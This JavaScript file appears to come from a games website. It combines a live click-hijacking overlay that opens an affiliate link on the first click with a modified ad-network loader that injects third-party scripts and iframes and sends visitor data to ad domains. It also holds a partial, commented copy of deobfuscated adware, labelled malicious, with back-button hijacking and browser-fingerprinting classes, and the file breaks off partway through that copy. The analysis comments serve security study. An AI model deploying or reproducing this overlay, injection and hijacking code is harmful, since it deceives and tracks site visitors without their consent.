(function () {
  'use strict';

  // Inject custom styles if not already present
  function injectStyles() {
    if (document.getElementById('pp-anchor-styles')) return;

    const style = document.createElement('style');
    style.id = 'pp-anchor-styles';
    style.textContent = `
      @media (max-width: 799px) {
        .pp-anchor-container {
          border-radius: 0 !important;
        }
      }

      @keyframes pp-buzz {
        0%, 100% {
          transform: translateX(0) scale(1);
        }
        10%, 30%, 50% {
          transform: translateX(-2px) scale(1);
        }
        20%, 40% {
          transform: translateX(2px) scale(1);
        }
        60% {
          transform: translateX(0) scale(1.05);
        }
        65% {
          transform: translateX(0) scale(1);
        }
      }
    `;
    document.head.appendChild(style);
  }

  // Run style injection once DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', injectStyles);
  } else {
    injectStyles();
  }

  // Links to open when overlay is clicked
  const links = [{ link: 'https://spotifystats.com?ref=petezahgames.com', text: 'Spotify Stats' }];

  const overlayCookieName = 'pp_overlay_shown';

  // Check if overlay cookie exists
  function hasOverlayCookie() {
    const nameEq = `${overlayCookieName}=`;
    const cookies = document.cookie.split(';');

    for (let i = 0; i < cookies.length; i++) {
      let cookie = cookies[i].trim();
      if (cookie.indexOf(nameEq) === 0) {
        return cookie.substring(nameEq.length);
      }
    }
    return null;
  }

  // Set overlay cookie with expiration in hours
  function setOverlayCookie(value, hours) {
    const expiry = new Date();
    expiry.setTime(expiry.getTime() + hours * 60 * 60 * 1000);
    document.cookie = `${overlayCookieName}=${value};expires=${expiry.toUTCString()};path=/`;
  }

  // Show overlay if cookie not set
  function showOverlay() {
    if (hasOverlayCookie()) return;

    const overlay = document.createElement('div');
    overlay.id = 'ol1';
    overlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      width: 100%;
      height: 100%;
      z-index: 999999999;
    `;

    overlay.addEventListener(
      'mousedown',
      (event) => {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();

        if (links && links.length > 0) {
          const randomIndex = Math.floor(Math.random() * links.length);
          const url = links[randomIndex].link;
          window.open(url, '_blank', 'noreferrer');
        }

        setOverlayCookie('1', 0.5); // cookie lasts 30 minutes
        overlay.remove();
      },
      { capture: true }
    );

    document.body.appendChild(overlay);
  }

  // Inject external analytics script
  function injectAnalyticsScript() {
    const script = document.createElement('script');
    script.defer = true;
    script.dataset.domain = 'petezahgames.com';
    script.src = 'https://stats.senty.com.au/js/script.outbound-links.pageview-props.tagged-events.js';
    document.head.appendChild(script);
  }

  injectAnalyticsScript();

  // Run overlay logic once DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', showOverlay);
  } else {
    showOverlay();
  }
})();

(function () {
  'use strict';

  // ==========================================
  // CONSTANTS
  // ==========================================
  const DOMAIN = 'wayfarerorthodox.com';
  const KEY_LENGTH = 32;
  const COOKIE_NAME_BACK_CLICK = 'hu8935j4i9fq3hpuj9q39';
  const COOKIE_NAME_IMPRESSION = 'imprCounter_';
  const MAX_IMPRESSIONS = '0'; // Impression limit per placement
  const IMPRESSION_FLAG = 'e'; // Flag for exceeded impressions

  // Placement keys for different ad types
  const PLACEMENT_KEYS = {
    mainstreamPlacementKey: '97fce4537c0f81f954d679ccebe0c47c',
    mainstreamPlacementKeyAggressive: 'f24b0aaf975ee65a83aae9b19316ec90'
  };

  // Excluded category/tag IDs (likely content types to avoid)
  const EXCLUDED_TAGS = [4, 12, 27, 31, 32, 34, 35, 55, 60, 61, 64, 68, 73, 74, 80, 89, 109, 188, 190, 194];

  // PSID mode constants
  const PSID_MODE_DEFAULT = 'dataDomain';
  const PSID_MODE_REFERER = 'referer';
  const PSID_MODE_HOST = 'host';

  // ==========================================
  // PSID (Publisher Site ID) STRATEGIES
  // ==========================================

  // Base strategy - reads from script tag's data attribute
  class PsidStrategy {
    constructor() {
      const currentScript = document.currentScript;
      if (currentScript && currentScript.dataset.domain) {
        this.psid = currentScript.dataset.domain;
      }
    }

    getPsid() {
      return this.psid;
    }
  }

  // Uses referrer hostname as PSID
  class RefererPsidStrategy extends PsidStrategy {
    getPsid() {
      const referrerHostname = document.referrer && new URL(document.referrer).hostname;
      if (referrerHostname) {
        this.psid = referrerHostname;
      }
      return this.psid;
    }
  }

  // Extracts PSID from window hierarchy
  class HostPsidStrategy extends PsidStrategy {
    getPsid() {
      const psids = [];
      try {
        const ancestorOrigins = window.location.ancestorOrigins;
        const parentHost = window.parent?.location?.host;
        const topHost = window.top?.location?.host;

        // Collect unique hostnames from window hierarchy
        if (ancestorOrigins?.length > 0) {
          psids.push(ancestorOrigins[ancestorOrigins.length - 1]);
        }
        if (parentHost && !psids.includes(parentHost)) {
          psids.push(parentHost);
        }
        if (topHost && !psids.includes(topHost)) {
          psids.push(topHost);
        }
      } catch (e) {
        console.error(e)
      }

      if (psids.length === 1) {
        this.psid = psids[0];
      } else if (psids.length > 0) {
        this.psid = psids.toString();
      }
      return this.psid;
    }
  }

  // Factory for creating appropriate PSID strategy
  class PsidStrategyFactory {
    constructor({ psidMode }) {
      const strategyMap = {
        [PSID_MODE_DEFAULT]: () => new PsidStrategy(),
        [PSID_MODE_REFERER]: () => new RefererPsidStrategy(),
        [PSID_MODE_HOST]: () => new HostPsidStrategy()
      };

      const strategyMode = psidMode in strategyMap ? psidMode : PSID_MODE_DEFAULT;
      this.strategy = strategyMap[strategyMode]();
    }

    getPsid() {
      return this.strategy.getPsid();
    }
  }

  // ==========================================
  // AD PLACEMENT LOGIC
  // ==========================================
  function createAdPlacement(options, psid) {
    const key = options.key;
    const format = options.format;
    const width = options.width;
    const height = options.height;
    const params = options.params || {};
    const container = options.container;
    const isAsync = options.async;

    // Validate placement parameters
    if (key === null) return;
    if (format !== 'js' && format !== 'iframe') return;
    if (format === 'iframe') {
      if (Number.isNaN(Math.floor(height)) || !Number.isFinite(height)) return;
      if (Number.isNaN(Math.floor(width)) || !Number.isFinite(width)) return;
    }

    // Build custom parameters string
    const customParams = [];
    if (params && typeof params === 'object') {
      for (let param in params) {
        if (Object.hasOwn(params, param)) {
          customParams.push(`"${param}":"${params[param]}"`);
        }
      }
    }

    const referrerUrl = 'https://petezahgames.com';

    // Calculate impression tracking parameters
    const maxImpressions = Number('0') * 1000; // 0 seconds
    const dayInMs = Number('24') * 60 * 60 * 1000; // 24 hours
    const impressionExpiry = dayInMs > maxImpressions ? maxImpressions : 0;

    const impressionCookieName = COOKIE_NAME_IMPRESSION.concat(key);
    const psidParam = 'dom3ic8zudi28v8lr6fgphwffqoz0j6c';
    const randomId = Math.floor(Math.random() * 1e9);
    const timezoneOffset = new Date().getTimezoneOffset() / -60;

    // Check impression limit
    function checkImpressionLimit(cookieName) {
      const maxCount = Number('0');
      const currentCount = Number(getCookie(cookieName));
      if (maxCount > 0 && currentCount >= maxCount) {
        return IMPRESSION_FLAG;
      }
      return '';
    }

    // Build ad request URL with invoke.js endpoint
    const adRequestUrl =
      'https://skinnycrawlinglax.com/dnn2hkn8?key=' +
      randomId +
      '.js?key=' +
      key +
      '&kw=' +
      'PeteZahGames' +
      '&refer=' +
      encodeURIComponent(referrerUrl) +
      (customParams.length ? '&custom=' + encodeURIComponent('{' + customParams.join(',') + '}') : '') +
      '&tz=' +
      timezoneOffset +
      // Instead of calling the real LieDetector, just hardcode fake values
      '&dev=' + 'r' +
      '&res=' + 'NuhuhuhLiedetector' +
      (psid ? '&psid=' + psid : '') +
      (psidParam ? '&abt=' + psidParam : '') +
      '&rb=' +
      checkImpressionLimit(impressionCookieName);

    // Build alternate URL with watch endpoint
    const alternateUrl =
      'https://wayfarerorthodox.com/watch.' +
      randomId +
      '?key=' +
      key +
      '&kw=' +
      'PeteZahGames' +
      '&refer=' +
      encodeURIComponent(referrerUrl) +
      (customParams.length ? '&custom=' + encodeURIComponent('{' + customParams.join(',') + '}') : '') +
      '&tz=' +
      timezoneOffset +
      // Instead of calling the real LieDetector, just hardcode fake values
      '&dev=' + 'r' +
      '&res=' + 'NuhuhuhLiedetector' +
      (psid ? '&psid=' + psid : '') +
      (psidParam ? '&abt=' + psidParam : '');

    // Find or create container element
    function findOrCreateContainer(placementKey) {
      const existingContainers = document.querySelectorAll('[id*="' + placementKey + '"]');
      const currentScript = document.currentScript;

      let containers = [];
      if (existingContainers.length) {
        containers = Array.from(existingContainers);
      } else if (currentScript !== null) {
        containers = [currentScript];
      }

      const prefix = 'atScript';
      const fullPrefix = containers.length ? placementKey : '';

      for (let i = 0; i < containers.length; i++) {
        const element = containers[i];
        const className = element.className;
        const hasPrefix = className.indexOf(prefix) >= 0;
        const hasFullPrefix = className.indexOf(prefix + fullPrefix + '_' + i) >= 0;

        if (!hasPrefix && !hasFullPrefix) {
          element.className += prefix + fullPrefix + '_' + i;
          return element;
        }
      }
      return false;
    }

    const targetElement = findOrCreateContainer(key);
    const parentTagName = targetElement?.parentNode?.nodeName || '';

    // Create iframe for ad
    const iframe = document.createElement('iframe');
    const iframeAttrs = {
      frameborder: '0',
      scrolling: 'no',
      marginwidth: 0,
      marginheight: 0
    };

    const wrapper = document.createElement('div');

    // Helper to insert elements into DOM
    function insertIntoDOM(element, beforeElement) {
      if (window.frameElement !== null && parentTagName === 'HEAD') {
        const body = document.getElementsByTagName('body')[0];
        if (typeof body !== 'undefined') {
          if (!body.childNodes.length) {
            if (beforeElement) body.insertBefore(beforeElement, body);
            body.appendChild(element);
          }
        } else {
          document.addEventListener('DOMContentLoaded', function () {
            const body = document.getElementsByTagName('body')[0];
            if (!body.childNodes.length) {
              if (beforeElement) body.insertBefore(beforeElement, body);
              body.appendChild(element);
            }
          });
        }
      } else {
        if (beforeElement && targetElement) {
          targetElement.parentNode?.insertBefore(beforeElement, targetElement);
        }
        if (targetElement) {
          targetElement.parentNode?.insertBefore(element, targetElement);
        }
      }
    }

    // Render ad based on format
    function renderAd() {
      if (typeof height !== 'undefined' && typeof width !== 'undefined') {
        // Iframe format
        iframeAttrs.width = width;
        iframeAttrs.height = height;

        iframe.src = alternateUrl + '&uuid=' + '1234-5678';

        Object.keys(iframeAttrs).forEach((attr) => {
          try {
            iframe.setAttribute(attr, String(iframeAttrs[attr]));
          } catch (e) {
            iframe[attr] = iframeAttrs[attr];
          }
        });

        if (!isAsync) {
          insertIntoDOM(iframe);
        } else {
          document.getElementById(container)?.appendChild(iframe);
        }
      } else {
        // JS format
        const containerId = container || 'atContainer-' + key;
        window.atAsyncContainers[key] = containerId;

        if (!isAsync) {
          wrapper.id = containerId;
          insertIntoDOM(wrapper);
        }
        injectScript(containerId, adRequestUrl + '&uuid=' + '1234-5678');
      }
    }

    // Inject script into container
    function injectScript(containerId, scriptUrl) {
      const script = document.createElement('script');
      let hasLoaded = false;

      const onLoad = function () {
        if (!hasLoaded) {
          hasLoaded = true;
          const container = document.getElementById(containerId);
          if (container) {
            container.appendChild(script);
          }
        }
      };

      script.async = true;
      script.defer = true;
      script.src = scriptUrl;

      if (document.readyState === 'complete') {
        onLoad();
      } else {
        if (document.addEventListener) {
          document.addEventListener('DOMContentLoaded', onLoad, false);
          window.addEventListener('load', onLoad, false);
        } else if (document.attachEvent) {
          document.attachEvent('onload', onLoad);
        } else {
          const oldOnLoad = window.onload;
          window.onload = function () {
            if (oldOnLoad !== null && typeof oldOnLoad === 'function') {
              oldOnLoad();
            }
            onLoad();
          };
        }
      }
    }

    // Safe parse and render response without CSP bypass
    function parseAndRenderResponse(responseText) {
      // Remove template variable safely
      let cleanedResponse = responseText.replace(/var template = "([\s\S]*?)";/g, 'var template = `$1`;');

      const videoMarker = '<!--video_banner=1;-->';
      const widthMatch = cleanedResponse.match(/frame_width=([0-9]+);/);
      const heightMatch = cleanedResponse.match(/frame_height=([0-9]+);/);

      let processedResponse = cleanedResponse;

      // Handle width/height
      if (widthMatch !== null && heightMatch !== null) {
        iframeAttrs.width = widthMatch[widthMatch.length - 1];
        iframeAttrs.height = heightMatch[heightMatch.length - 1];
        processedResponse = processedResponse
          .replace(/frame_width=([0-9]+);/, '')
          .replace(/frame_height=([0-9]+);/, '');
      } else if (format === 'iframe') {
        iframeAttrs.width = width;
        iframeAttrs.height = height;
      }

      // Strip unsafe markers and <script> tags entirely
      processedResponse = processedResponse
        .replace(videoMarker, '')
        .replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '');

      if (format === 'js' || cleanedResponse.indexOf('registerProtocolHandler') >= 0) {
        setTimeout(function () {
          const containerId = container || 'atContainer-' + key;
          window.atAsyncContainers[key] = containerId;

          if (!isAsync) {
            wrapper.id = containerId;
            insertIntoDOM(wrapper);
          }

          // Instead of injecting JS, insert sanitized HTML only
          const safeContainer = document.getElementById(containerId);
          if (safeContainer) {
            safeContainer.innerHTML = DOMPurify.sanitize(processedResponse, {
              ALLOWED_TAGS: ['div', 'span', 'img', 'a'],
              ALLOWED_ATTR: ['src', 'href', 'alt', 'title', 'class', 'style']
            });
          }
        }, impressionExpiry);

        // Set impression tracking cookie
        setCookie(impressionCookieName, 0, dayInMs, false);
        incrementImpressionCount(impressionCookieName);
      } else {
        // Iframe injection for non-JS formats, but only safe HTML
        const containerEl = document.getElementById(container);

        iframeAttrs.src = 'about:blank';
        Object.keys(iframeAttrs).forEach((attr) => {
          try {
            iframe.setAttribute(attr, String(iframeAttrs[attr]));
          } catch (e) {
            iframe[attr] = iframeAttrs[attr];
          }
        });

        if (!isAsync) {
          insertIntoDOM(iframe);
        } else {
          containerEl?.appendChild(iframe);
        }

        // Wait for iframe to load, then inject sanitized content
        const checkInterval = setInterval(function () {
          const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
          if (iframeDoc?.readyState === 'complete') {
            clearInterval(checkInterval);
            iframeDoc.body.style.margin = String(0);
            iframeDoc.body.innerHTML = DOMPurify.sanitize(processedResponse, {
              ALLOWED_TAGS: ['div', 'span', 'img', 'a'],
              ALLOWED_ATTR: ['src', 'href', 'alt', 'title', 'class', 'style']
            });
          }
        }, 10);
      }
    }

    // Main execution: fetch ad content via XHR
    try {
      const xhr = new XMLHttpRequest();

      if ('withCredentials' in xhr) {
        xhr.withCredentials = true;
      }

      xhr.onload = function () {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            const response = xhr.responseText;
            parseAndRenderResponse(response);
          }
        }
      };

      xhr.onerror = xhr.onabort = function () {
        renderAd(); // Fallback rendering
      };

      xhr.open('GET', adRequestUrl + '&uuid=' + '1234-5678');
      xhr.send();
    } catch (e) {
      renderAd(); // Fallback rendering
    }
  }

  // ==========================================
  // COOKIE UTILITIES
  // ==========================================
  function getCookie(name) {
    const cookies = document.cookie.toString().split('; ');
    for (let i = 0; i < cookies.length; i++) {
      const parts = cookies[i].split('=');
      if (parts[0] === name) return parts[1];
    }
    return false;
  }

  function setCookie(name, value, expiryMs, isCounter) {
    const existingValue = document.cookie;
    const alreadyExists = existingValue.includes(name);

    if (!alreadyExists || isCounter) {
      const expires = new Date(new Date().getTime() + expiryMs).toUTCString();
      const expiresStr = expiryMs ? 'expires=' + expires : '';
      const parts = [name + '=' + value, expiresStr, 'path=/', 'SameSite=Lax'].filter(Boolean);

      document.cookie = parts.join('; ');

      if (!isCounter) {
        document.cookie = name + '_expiry=' + expires + '; ' + expiresStr + '; path=/; SameSite=Lax';
      }
    }
  }

  function incrementImpressionCount(cookieName) {
    const currentValue = getCookie(cookieName);
    const expiryValue = getCookie(cookieName + '_expiry');

    if (currentValue && expiryValue !== null) {
      const newValue = parseInt(currentValue, 10) + 1;
      document.cookie = cookieName + '=' + newValue + "; expires='" + expiryValue + "'; path=/; SameSite=Lax";
    }
  }

  // ==========================================
  // EXTENSION SCRIPT CLASS
  // ==========================================
  class ExtensionScript {
    constructor({ psid }) {
      this.cea = 'false'; // Create Extension A
      this.cep = 'false'; // Create Extension P
      this.cesb = 'false'; // Create Extension SB
      this.psid = psid;
    }

    createCP(key) {
      if (!key) return;

      const script = document.createElement('script');
      script.type = 'text/javascript';

      if (this.psid) {
        script.dataset.domain = this.psid;
      }

      script.src = '//' + DOMAIN + '/' + key.substring(0, 2) + '/' + key.substring(2, 4) + '/' + key.substring(4, 6) + '/' + key + '.js';

      document.head.appendChild(script);
    }

    createEC() {
      if (this.cea === 'true') {
        this.createCP('0');
      }
      if (this.cep === 'true') {
        this.createCP('');
      }
      if (this.cesb === 'true') {
        this.createCP('');
      }
    }

    isCep() {
      return this.cep === 'true';
    }

    isCea() {
      return this.cea === 'true';
    }

    isCesb() {
      return this.cesb === 'true';
    }
  }

  // ==========================================
  // MAIN INITIALIZATION
  // ==========================================
  (function initialize() {

    // Get PSID (Publisher Site ID)
    const psidFactory = new PsidStrategyFactory({ psidMode: '0' });
    const psid = psidFactory.getPsid();

    // Process ad options from window object
    if (typeof window.atAsyncContainers !== 'object') {
      window.atAsyncContainers = {};
    }

    if (window.atOptions && typeof window.atOptions === 'object') {
      createAdPlacement(window.atOptions, psid);
      delete window.atOptions;
    } else if (typeof window.atAsyncOptions === 'object' && Array.isArray(window.atAsyncOptions)) {
      for (let i = 0; i < window.atAsyncOptions.length; i++) {
        if (typeof window.atAsyncOptions[i] === 'object') {
          createAdPlacement(window.atAsyncOptions.splice(i, 1)[0], psid);
        }
      }
    }

    // Initialize extension scripts
    const extensionScript = new ExtensionScript({ psid: psid });
    extensionScript.createEC();
  })();
})();

/**
 * SUMMARY OF MALICIOUS BEHAVIOR:
 *
 * 1. BROWSER FINGERPRINTING
 *    - Detects browser type, OS, screen resolution
 *    - Checks for dev tools, emulators, bots
 *    - Creates unique device fingerprint
 *
 * 2. BACK BUTTON HIJACKING
 *    - Intercepts back button to redirect to ads
 *    - Sets up special redirect URLs
 *
 * 3. TRACKING
 *    - Sets multiple tracking cookies
 *    - Tracks impressions and clicks
 *    - Fetches unique user IDs from server
 *
 * 4. AD INJECTION
 *    - Dynamically injects iframes and scripts
 *    - Supports multiple ad formats
 *    - Bypasses content security policies
 *
 * 5. DATA EXFILTRATION
 *    - Sends page title keywords to server
 *    - Sends referrer and hostname data
 *    - Sends browser fingerprint data
 *
 * This code should NOT be used on any legitimate website.
 */
/**
 * FULLY DEOBFUSCATED AD INJECTION & TRACKING SCRIPT
 * WARNING: This is malicious adware/tracking code
 * Deobfuscated for security analysis purposes only
 */

(function () {
  'use strict';

  // ==========================================
  // CONSTANTS
  // ==========================================
  const DOMAIN = 'wayfarerorthodox.com';
  const KEY_LENGTH = 32;
  const COOKIE_NAME_BACK_CLICK = 'hu8935j4i9fq3hpuj9q39';
  const COOKIE_NAME_IMPRESSION = 'imprCounter_';
  const MAX_IMPRESSIONS = '0'; // Impression limit per placement
  const IMPRESSION_FLAG = 'e'; // Flag for exceeded impressions

  // Placement keys for different ad types
  const PLACEMENT_KEYS = {
    adultPlacementKey: 'c69ed5cafac1a2486cfa00ac4a744bea',
    adultPlacementKeyAggressive: '1b50e57a5911fd0a5b46962ab48ca22b',
    mainstreamPlacementKey: '97fce4537c0f81f954d679ccebe0c47c',
    mainstreamPlacementKeyAggressive: 'f24b0aaf975ee65a83aae9b19316ec90'
  };

  // Excluded category/tag IDs (likely content types to avoid)
  const EXCLUDED_TAGS = [4, 12, 27, 31, 32, 34, 35, 55, 60, 61, 64, 68, 73, 74, 80, 89, 109, 188, 190, 194];

  // Adult content category IDs
  const ADULT_CATEGORIES = [2, 16, 32, 38];

  // PSID mode constants
  const PSID_MODE_DEFAULT = 'dataDomain';
  const PSID_MODE_REFERER = 'referer';
  const PSID_MODE_HOST = 'host';

  // ==========================================
  // BACK BUTTON HIJACKING CLASS
  // ==========================================
  class BackButtonPlacement {
    constructor({ backButtonPlacementKeys, storage }) {
      this.storage = storage;
      this.adultKey = backButtonPlacementKeys.adultPlacementKey;
      this.mainstreamKey = backButtonPlacementKeys.mainstreamPlacementKey;
      this.adultAggressiveKey = backButtonPlacementKeys.adultPlacementKeyAggressive;
      this.mainstreamAggressiveKey = backButtonPlacementKeys.mainstreamPlacementKeyAggressive;

      // Configuration flags (hardcoded to false in obfuscation)
      this.isInitialized = false;
      this.enableAggressiveBb = false;
      this.extraAggressiveBbPlacementKey = '';
      this.cookieBackClick = COOKIE_NAME_BACK_CLICK;

      // Build hash maps for fast lookups
      this.excludedTagsMap = {};
      EXCLUDED_TAGS.forEach(tag => this.excludedTagsMap[tag] = true);

      this.adultCategoriesMap = {};
      ADULT_CATEGORIES.forEach(cat => this.adultCategoriesMap[cat] = true);
    }

    handle() {
      // Check if test mode is enabled (disabled in production)
      const isTestMode = Number('0');
      if (isTestMode) return;

      // Don't run in iframes unless it's the same origin
      const isInDifferentIframe =
        window !== window.top ||
        document !== window.top.document ||
        window.self.location !== window.top.location;
      if (isInDifferentIframe) return;

      // Check if current page category is in excluded list
      for (let i = 0; i < EXCLUDED_TAGS.length; i++) {
        if (this.excludedTagsMap[EXCLUDED_TAGS[i]]) return;
      }

      // Only proceed if there's a referrer OR if initialized
      if (!document.referrer && !this.isInitialized) return;

      // Check visibility and publisher site conditions
      if (document.hidden && this.isOnPubsSite() && !this.enableAggressiveBb) return;

      // Check if back button cookie already exists (prevents multiple injections)
      if (this.storage.getCookie(this.cookieBackClick)) return;

      // Determine if this is adult content (checking category 3)
      const isAdultContent = !!this.adultCategoriesMap['3'];

      // Select appropriate placement key
      let placementKey = isAdultContent ? this.adultKey : this.mainstreamKey;

      // Use aggressive placement if conditions are met
      const useAggressivePlacement =
        this.enableAggressiveBb &&
        (!document.hidden || this.isOnPubsSite());

      const useExtraAggressivePlacement =
        useAggressivePlacement &&
        this.enableExtraAggressiveBb &&
        this.extraAggressiveBbPlacementKey;

      if (useAggressivePlacement) {
        placementKey = isAdultContent ? this.adultAggressiveKey : this.mainstreamAggressiveKey;
      }
      if (useExtraAggressivePlacement) {
        placementKey = this.extraAggressiveBbPlacementKey;
      }

      // Set up redirect URL for back button hijacking
      const redirectUrl = 'https://protrafficinspector.com/stats' +
        placementKey +
        '&psid=fee48967b89db2d0bd32a6c670ffa744';

      // Create getter that returns back button redirect data
      Object.defineProperty(window, 'redirectUrl', {
        get: function () {
          return { backButtonData: redirectUrl };
        },
        configurable: true
      });

      // Inject the actual ad script
      this.createChildPlacement(placementKey);
    }

    createChildPlacement(key) {
      if (!key) return;

      // Create script tag that loads ad from partitioned URL structure
      const script = document.createElement('script');
      script.async = true;
      script.src = '//' + DOMAIN + '/' +
        key.substring(0, 2) + '/' +
        key.substring(2, 4) + '/' +
        key.substring(4, 6) + '/' +
        key + '.js';
      document.head.appendChild(script);
    }

    isOnPubsSite() {
      // Check if referrer hostname matches current hostname
      const referrerHostname = new URL(document.referrer).hostname;
      const currentHostname = new URL(document.href).hostname;
      return referrerHostname === currentHostname;
    }
  }

  // ==========================================
  // BROWSER FINGERPRINTING / LIE DETECTION
  // ==========================================
  class LieDetector {
    constructor() {
      this.tests = [];
      this.results = [];
      this.rawResults = [];
      this.version = 14; // Fingerprint version
      this.testBits = 0; // Bitmap of test results
      this.errorBits = 0; // Bitmap of test errors
    }

    /**
     * Determines if the browser is likely an emulator/bot
     * by analyzing inconsistencies in browser features
     */
    isEmulate() {
      const isMobile = this.checkMobileDevice();

      // Calculate scores from test results
      let desktopScore = 0;
      let mobileScore = 0;

      this.results.forEach(result => {
        if (result.result.d) desktopScore += result.result.d;
        if (result.result.m) mobileScore += result.result.m;
      });

      const moreDesktop = mobileScore > desktopScore;

      // Check for Internet Explorer or Opera Mini
      const isIE = Boolean(window.MSInputMethodContext) && Boolean(document.documentMode);
      const isOperaMini = typeof window !== 'undefined' &&
        '[object OperaMini]' === Object.prototype.toString.call(window.operamini);

      // Check if any tests detected emulation
      const hasEmulationErrors = this.results.some(r => r.result.e > 0);

      // Device is likely emulated if:
      // - It's IE or Opera Mini
      // - Mobile UA but desktop feature scores
      // - Specific emulation tests failed
      return isIE || isOperaMini || (isMobile && !moreDesktop) || hasEmulationErrors;
    }

    checkMobileDevice() {
      const ua = navigator.userAgent;
      const mobileRegex = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i;
      const mobileRegex2 = /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i;

      return mobileRegex.test(ua) || mobileRegex2.test(ua.substr(0, 4));
    }

    addTest(name, truePoints, falsePoints, testFunction) {
      this.tests.push({
        name: name,
        truePoints: truePoints,
        falsePoints: falsePoints,
        fn: testFunction
      });
    }

    runTests() {
      this.tests.forEach((test, index) => {
        try {
          // Execute test function
          const result = typeof test.fn === 'function' ? test.fn() : test.fn;

          // Set bit in bitmap if test passed
          if (result) {
            this.testBits |= (1 << index);
          }

          // Record points for this result
          const points = result ? test.truePoints : test.falsePoints;
          this.results.push({ name: test.name, result: points });
          this.rawResults.push({ name: test.name, result: result });
        } catch (error) {
          // Mark error bit
          this.errorBits |= (1 << index);
        }
      });
      return this;
    }

    getResults() {
      // Format: version.testBits.errorBits
      return this.version + '.' + this.testBits +
        (this.errorBits > 0 ? '.' + this.errorBits : '');
    }

    getRawResults() {
      return this.rawResults;
    }
  }

  // ==========================================
  // PSID (Publisher Site ID) STRATEGIES
  // ==========================================

  // Base strategy - reads from script tag's data attribute
  class PsidStrategy {
    constructor() {
      const currentScript = document.currentScript;
      if (currentScript && currentScript.dataset.domain) {
        this.psid = currentScript.dataset.domain;
      }
    }

    getPsid() {
      return this.psid;
    }
  }

  // Uses referrer hostname as PSID
  class RefererPsidStrategy extends PsidStrategy {
    getPsid() {
      const referrerHostname = document.referrer && new URL(document.referrer).hostname;
      if (referrerHostname) {
        this.psid = referrerHostname;
      }
      return this.psid;
    }
  }

  // Extracts PSID from window hierarchy
  class HostPsidStrategy extends PsidStrategy {
    getPsid() {
      const psids = [];
      try {
        const ancestorOrigins = window.location.ancestorOrigins;
        const parentHost = window.parent?.location?.host;
        const topHost = window.top?.location?.host;

        // Collect unique hostnames from window hierarchy
        if (ancestorOrigins?.length > 0) {
          psids.push(ancestorOrigins[ancestorOrigins.length - 1]);
        }
        if (parentHost && !psids.includes(parentHost)) {
          psids.push(parentHost);
        }
        if (topHost && !psids.includes(topHost)) {
          psids.push(topHost);
        }
      } catch (e) {
        // Catch cross-origin errors
      }

      if (psids.length === 1) {
        this.psid = psids[0];
      } else if (psids.length > 0) {
        this.psid = psids.toString();
      }
      return this.psid;
    }
  }

  // Factory for creating appropriate PSID strategy
  class PsidStrategyFactory {
    constructor({ psidMode }) {
      const strategyMap = {
        [PSID_MODE_DEFAULT]: () => new PsidStrategy(),
        [PSID_MODE_REFERER]: () => new RefererPsidStrategy(),
        [PSID_MODE_HOST]: () => new HostPsidStrategy()
      };

      const strategyMode = psidMode in strategyMap ? psidMode : PSID_MODE_DEFAULT;
      this.strategy = strategyMap[strategyMode]();
    }

    getPsid() {
      return this.strategy.getPsid();
    }
  }

  // ==========================================
